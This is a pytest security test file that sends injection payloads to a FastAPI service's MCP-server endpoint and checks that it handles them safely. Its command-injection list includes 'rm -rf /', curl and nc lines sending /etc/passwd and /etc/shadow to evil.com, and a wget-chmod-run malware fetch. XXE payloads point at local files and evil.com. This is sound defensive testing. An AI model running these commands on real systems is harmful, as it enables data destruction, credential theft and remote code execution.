"""
Security tests for input validation and injection attacks.
"""
import pytest
from fastapi import status
from httpx import AsyncClient

from tests.utils import APITestHelper, SecurityTestHelper, DataFactory


@pytest.mark.security
@pytest.mark.asyncio
class TestInputValidation:
    """Test suite for input validation security."""
    
    async def test_sql_injection_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against SQL injection attacks."""
        sql_payloads = SecurityTestHelper.get_sql_injection_payloads()
        
        for payload in sql_payloads:
            # Test in server name
            server_data = DataFactory.create_mcp_server_data(name=payload)
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should not cause server error or expose database structure
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, \
                f"SQL injection payload caused server error: {payload}"
            
            # Check response doesn't contain SQL error messages
            response_text = response.text.lower()
            sql_error_keywords = [
                "syntax error", "mysql", "postgresql", "sqlite", "sql", 
                "database", "table", "column", "constraint", "violation"
            ]
            
            for keyword in sql_error_keywords:
                assert keyword not in response_text, \
                    f"Response contains SQL-related keyword for payload {payload}: {keyword}"
    
    async def test_xss_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against XSS attacks."""
        xss_payloads = SecurityTestHelper.get_xss_payloads()
        
        for payload in xss_payloads:
            # Test in various fields
            test_cases = [
                DataFactory.create_mcp_server_data(name=payload),
                DataFactory.create_mcp_server_data(description=payload),
                DataFactory.create_mcp_server_data(command=payload),
            ]
            
            for server_data in test_cases:
                response = await async_client.post(
                    "/api/v1/mcp-servers/",
                    json=server_data,
                    headers=auth_headers
                )
                
                # XSS payload should not appear unescaped in response
                response_text = response.text
                
                # Check that dangerous script content is not reflected unescaped
                dangerous_patterns = ["<script>", "javascript:", "onerror=", "onload="]
                for pattern in dangerous_patterns:
                    if pattern in payload.lower():
                        assert pattern not in response_text or \
                               response_text.count(pattern) != payload.lower().count(pattern), \
                               f"XSS payload appears unescaped in response: {payload}"
    
    async def test_command_injection_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against command injection attacks."""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& echo vulnerable",
            "$(id)",
            "`whoami`",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
            "| nc evil.com 1234 < /etc/shadow",
            "; wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh",
        ]
        
        for payload in command_injection_payloads:
            # Test in command field
            server_data = DataFactory.create_mcp_server_data(command=payload)
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should not execute commands or cause unexpected behavior
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, \
                f"Command injection payload caused server error: {payload}"
            
            # Test in args field
            server_data = DataFactory.create_mcp_server_data(args=[payload])
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, \
                f"Command injection in args caused server error: {payload}"
    
    async def test_path_traversal_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ]
        
        for payload in path_traversal_payloads:
            # Test in command field (file path)
            server_data = DataFactory.create_mcp_server_data(command=payload)
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should not expose file system structure
            response_text = response.text.lower()
            
            # Check for signs of successful path traversal
            file_content_indicators = [
                "root:", "daemon:", "bin:", "sys:", "administrator", 
                "[boot loader]", "windows registry", "/etc/passwd", "/etc/shadow"
            ]
            
            for indicator in file_content_indicators:
                assert indicator not in response_text, \
                    f"Path traversal may have succeeded with payload: {payload}"
    
    async def test_ldap_injection_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against LDAP injection attacks."""
        ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(uid=*",
            "admin)(&(|(uid=*",
            "*)((|uid=*",
            "*))%00",
            "admin)(|(uid=*))",
        ]
        
        for payload in ldap_injection_payloads:
            # Test in name field (might be used for LDAP queries)
            server_data = DataFactory.create_mcp_server_data(name=payload)
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should not cause LDAP errors or expose directory structure
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, \
                f"LDAP injection payload caused server error: {payload}"
            
            response_text = response.text.lower()
            ldap_error_keywords = ["ldap", "directory", "distinguished name", "dc=", "ou="]
            
            for keyword in ldap_error_keywords:
                assert keyword not in response_text, \
                    f"Response contains LDAP-related keyword for payload {payload}: {keyword}"
    
    async def test_xml_injection_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against XML injection attacks."""
        xml_injection_payloads = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/steal'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'>%xxe;]>",
        ]
        
        for payload in xml_injection_payloads:
            # Test in description field (might be processed as XML)
            server_data = DataFactory.create_mcp_server_data(description=payload)
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should not parse XML or expose file contents
            response_text = response.text
            
            # Check for signs of XML parsing or file disclosure
            xml_indicators = ["<!DOCTYPE", "<!ENTITY", "<?xml", "/etc/passwd", "root:"]
            
            for indicator in xml_indicators:
                if indicator in payload:
                    assert response_text.count(indicator) <= payload.count(indicator), \
                        f"XML injection may have succeeded with payload: {payload}"
    
    async def test_json_injection_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against JSON injection attacks."""
        # Test with malformed JSON structures
        json_injection_payloads = [
            '{"test": "value", "malicious": {"nested": true}}',
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
        ]
        
        for payload in json_injection_payloads:
            # Test in config field (JSON field)
            try:
                import json
                parsed_payload = json.loads(payload)
                server_data = DataFactory.create_mcp_server_data(config=parsed_payload)
                
                response = await async_client.post(
                    "/api/v1/mcp-servers/",
                    json=server_data,
                    headers=auth_headers
                )
                
                # Should not cause prototype pollution or privilege escalation
                assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, \
                    f"JSON injection payload caused server error: {payload}"
                
            except json.JSONDecodeError:
                # Invalid JSON should be rejected during validation
                pass
    
    async def test_header_injection_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against HTTP header injection attacks."""
        header_injection_payloads = [
            "test\r\nX-Injected: true",
            "test\nX-Injected: true",
            "test\r\nSet-Cookie: admin=true",
            "test\r\nLocation: http://evil.com",
        ]
        
        for payload in header_injection_payloads:
            # Test in custom headers
            malicious_headers = {**auth_headers, "X-Custom-Header": payload}
            
            response = await async_client.get("/api/v1/mcp-servers/", headers=malicious_headers)
            
            # Check that injected headers don't appear in response
            injected_headers = ["X-Injected", "Set-Cookie", "Location"]
            
            for header in injected_headers:
                assert header not in response.headers, \
                    f"Header injection succeeded with payload: {payload}"
    
    async def test_buffer_overflow_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against buffer overflow attacks."""
        # Test with very large payloads
        large_payloads = [
            "A" * 10000,  # 10KB
            "A" * 100000,  # 100KB
            "A" * 1000000,  # 1MB
        ]
        
        for payload in large_payloads:
            server_data = DataFactory.create_mcp_server_data(description=payload)
            
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should handle large inputs gracefully
            assert response.status_code in [
                status.HTTP_201_CREATED,  # Accepted
                status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,  # Rejected due to size
                status.HTTP_422_UNPROCESSABLE_ENTITY,  # Rejected due to validation
                status.HTTP_400_BAD_REQUEST,  # Rejected due to format
                status.HTTP_501_NOT_IMPLEMENTED  # Current implementation
            ], f"Large payload caused unexpected status: {response.status_code}"
    
    async def test_unicode_and_encoding_attacks(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against Unicode and encoding attacks."""
        unicode_payloads = [
            "test\u0000null",  # Null byte
            "test\u202e\u202d",  # Unicode direction override
            "test\ufeff",  # Byte order mark
            "test\u2028\u2029",  # Line/paragraph separator
            "test\ud800\udc00",  # Surrogate pairs
            "café",  # Normal Unicode
            "тест",  # Cyrillic
            "测试",  # Chinese
            "🚀🔥💯",  # Emojis
        ]
        
        for payload in unicode_payloads:
            server_data = DataFactory.create_mcp_server_data(name=payload)
            
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            # Should handle Unicode gracefully
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, \
                f"Unicode payload caused server error: {payload}"
            
            # Validate encoding in response
            if response.status_code < 500:
                try:
                    response.json()  # Should be valid JSON
                except ValueError:
                    pytest.fail(f"Response not valid JSON for Unicode payload: {payload}")
    
    async def test_regex_dos_protection(self, async_client: AsyncClient, auth_headers: dict):
        """Test protection against Regular Expression DoS attacks."""
        # Patterns that can cause catastrophic backtracking
        regex_dos_payloads = [
            "a" * 100 + "X",  # For regex like (a+)+b
            "a" * 100 + "!",  # For regex like (a|a)*b
            "(" * 100 + ")" * 100,  # Nested groups
        ]
        
        for payload in regex_dos_payloads:
            import time
            
            start_time = time.time()
            server_data = DataFactory.create_mcp_server_data(name=payload)
            
            response = await async_client.post(
                "/api/v1/mcp-servers/",
                json=server_data,
                headers=auth_headers
            )
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Should not take excessively long to process
            assert processing_time < 5.0, \
                f"Potential ReDoS attack detected, processing took {processing_time:.2f}s for payload: {payload}"
            
            # Should not cause server error
            assert response.status_code != status.HTTP_500_INTERNAL_SERVER_ERROR, \
                f"ReDoS payload caused server error: {payload}"